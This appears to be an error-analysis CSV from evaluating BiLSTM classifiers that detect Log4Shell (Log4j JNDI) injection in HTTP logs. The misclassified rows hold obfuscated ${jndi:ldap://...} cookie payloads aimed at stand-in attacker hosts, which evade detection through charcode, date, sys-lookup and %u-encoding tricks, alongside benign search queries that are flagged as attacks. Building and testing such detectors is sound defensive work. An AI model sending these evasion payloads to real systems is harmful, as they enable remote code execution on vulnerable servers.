model,test_set,id,source,raw_log,normalized_log,true_label,pred_label,score,threshold,error_type,obfuscation_type,explanation
Raw BiLSTM,ood_stress_test.csv,OOD-900262,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fprobe.example.net%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900262,get /search?q=${jndi:ldap://probe.example.net/research}&intent=research http/1.1 trace_id=benign-ood-900262,0,1,0.9999043941497803,0.49999999999999994,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900068,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://log4j-test.invalid/charcode}; sid=ood900068,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://log4j-test.invalid/charcode}; sid=ood900068,1,0,0.0003470269148238003,0.49999999999999994,false_negative_unknown_obfuscation,charcode_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900287,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Flab-callback.example.org%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900287,get /search?q=${jndi:ldap://lab-callback.example.org/research}&intent=research http/1.1 trace_id=benign-ood-900287,0,1,0.9999042749404907,0.49999999999999994,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900064,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://log4j-test.invalid/date-fragment}; sid=ood900064,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://log4j-test.invalid/date-fragment}; sid=ood900064,1,0,0.00034646232961677015,0.49999999999999994,false_negative_unknown_obfuscation,date_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900008,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://evil.example/sys-separator}; sid=ood900008,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://evil.example/sys-separator}; sid=ood900008,1,0,0.00034596919431351125,0.49999999999999994,false_negative_unknown_obfuscation,sys_lookup_separator,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900144,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://lab-callback.example.org/protocol-sys}; sid=ood900144,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://lab-callback.example.org/protocol-sys}; sid=ood900144,1,0,0.00034589742426760495,0.49999999999999994,false_negative_unknown_obfuscation,protocol_fragment_sys_lookup,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900285,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Flab-callback.example.org%2Fresearch%7D&intent=research HTTP/1.1,get /search?q=${jndi:ldap://lab-callback.example.org/research}&intent=research http/1.1,0,1,0.9999039173126221,0.49999999999999994,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900084,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://callback.local/unsupported-namespace}; sid=ood900084,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://callback.local/unsupported-namespace}; sid=ood900084,1,0,0.0003471680684015155,0.49999999999999994,false_negative_unknown_obfuscation,unsupported_lookup_namespace,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900032,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://attacker.evil.com/sys-separator}; sid=ood900032,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://attacker.evil.com/sys-separator}; sid=ood900032,1,0,0.0003459751314949244,0.49999999999999994,false_negative_unknown_obfuscation,sys_lookup_separator,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900028,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fattacker.evil.com%u002Fpercent-u%u007D; sid=ood900028,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fattacker.evil.com%u002fpercent-u%u007d; sid=ood900028,1,0,0.0003389161138329655,0.49999999999999994,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900166,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900166,get /search?q=${jndi:ldap://evil.example/research}&intent=research http/1.1 trace_id=benign-ood-900166,0,1,0.9999008178710938,0.49999999999999994,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900012,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://evil.example/unsupported-namespace}; sid=ood900012,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://evil.example/unsupported-namespace}; sid=ood900012,1,0,0.00034716821392066777,0.49999999999999994,false_negative_unknown_obfuscation,unsupported_lookup_namespace,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900052,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Flog4j-test.invalid%u002Fpercent-u%u007D; sid=ood900052,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=%u0024%u007bjndi%u003aldap%u003a%u002f%u002flog4j-test.invalid%u002fpercent-u%u007d; sid=ood900052,1,0,0.00033888668986037374,0.49999999999999994,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900214,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Flog4j-test.invalid%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900214,get /search?q=${jndi:ldap://log4j-test.invalid/research}&intent=research http/1.1 trace_id=benign-ood-900214,0,1,0.9998968839645386,0.49999999999999994,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900124,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Flab-callback.example.org%u002Fpercent-u%u007D; sid=ood900124,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=%u0024%u007bjndi%u003aldap%u003a%u002f%u002flab-callback.example.org%u002fpercent-u%u007d; sid=ood900124,1,0,0.0003389385819900781,0.49999999999999994,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900088,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://callback.local/date-fragment}; sid=ood900088,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://callback.local/date-fragment}; sid=ood900088,1,0,0.00034646232961677015,0.49999999999999994,false_negative_unknown_obfuscation,date_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900120,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://probe.example.net/protocol-sys}; sid=ood900120,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://probe.example.net/protocol-sys}; sid=ood900120,1,0,0.0003458964638411999,0.49999999999999994,false_negative_unknown_obfuscation,protocol_fragment_sys_lookup,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900190,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.evil.com%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900190,get /search?q=${jndi:ldap://attacker.evil.com/research}&intent=research http/1.1 trace_id=benign-ood-900190,0,1,0.9999017119407654,0.49999999999999994,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900112,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://probe.example.net/date-fragment}; sid=ood900112,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://probe.example.net/date-fragment}; sid=ood900112,1,0,0.0003464621549937874,0.49999999999999994,false_negative_unknown_obfuscation,date_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900286,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Flab-callback.example.org%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900286,get /search?q=${jndi:ldap://lab-callback.example.org/research}&intent=research http/1.1 trace_id=benign-ood-900286,0,1,0.9999042749404907,0.49999999999999994,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900072,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://log4j-test.invalid/protocol-sys}; sid=ood900072,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://log4j-test.invalid/protocol-sys}; sid=ood900072,1,0,0.00034587737172842026,0.49999999999999994,false_negative_unknown_obfuscation,protocol_fragment_sys_lookup,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900191,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.evil.com%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900191,get /search?q=${jndi:ldap://attacker.evil.com/research}&intent=research http/1.1 trace_id=benign-ood-900191,0,1,0.9999017119407654,0.49999999999999994,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900056,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://log4j-test.invalid/sys-separator}; sid=ood900056,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://log4j-test.invalid/sys-separator}; sid=ood900056,1,0,0.00034595781471580267,0.49999999999999994,false_negative_unknown_obfuscation,sys_lookup_separator,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900140,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://lab-callback.example.org/charcode}; sid=ood900140,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://lab-callback.example.org/charcode}; sid=ood900140,1,0,0.0003470274095889181,0.49999999999999994,false_negative_unknown_obfuscation,charcode_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900132,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://lab-callback.example.org/unsupported-namespace}; sid=ood900132,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://lab-callback.example.org/unsupported-namespace}; sid=ood900132,1,0,0.00034716888330876827,0.49999999999999994,false_negative_unknown_obfuscation,unsupported_lookup_namespace,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900264,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fprobe.example.net%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900264,get /search?q=${jndi:ldap://probe.example.net/research}&intent=research http/1.1 trace_id=benign-ood-900264,0,1,0.9999043941497803,0.49999999999999994,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900239,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fcallback.local%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900239,get /search?q=${jndi:ldap://callback.local/research}&intent=research http/1.1 trace_id=benign-ood-900239,0,1,0.999901294708252,0.49999999999999994,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900060,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://log4j-test.invalid/unsupported-namespace}; sid=ood900060,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://log4j-test.invalid/unsupported-namespace}; sid=ood900060,1,0,0.00034716789377853274,0.49999999999999994,false_negative_unknown_obfuscation,unsupported_lookup_namespace,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900108,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://probe.example.net/unsupported-namespace}; sid=ood900108,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://probe.example.net/unsupported-namespace}; sid=ood900108,1,0,0.0003471692034509033,0.49999999999999994,false_negative_unknown_obfuscation,unsupported_lookup_namespace,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900192,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.evil.com%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900192,get /search?q=${jndi:ldap://attacker.evil.com/research}&intent=research http/1.1 trace_id=benign-ood-900192,0,1,0.9999017119407654,0.49999999999999994,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,ood_stress_test.csv,OOD-900215,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Flog4j-test.invalid%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900215,get /search?q=${jndi:ldap://log4j-test.invalid/research}&intent=research http/1.1 trace_id=benign-ood-900215,0,1,0.9998968839645386,0.49999999999999994,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
Normalized BiLSTM,ood_stress_test.csv,OOD-900167,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900167,get /search?q=${jndi:ldap://evil.example/research}&intent=research http/1.1 trace_id=benign-ood-900167,0,1,0.999252438545227,0.49999999999999994,false_positive_keyword_only,benign_encoded_search_query,Model score disagreed with the dataset label at the evaluation threshold.
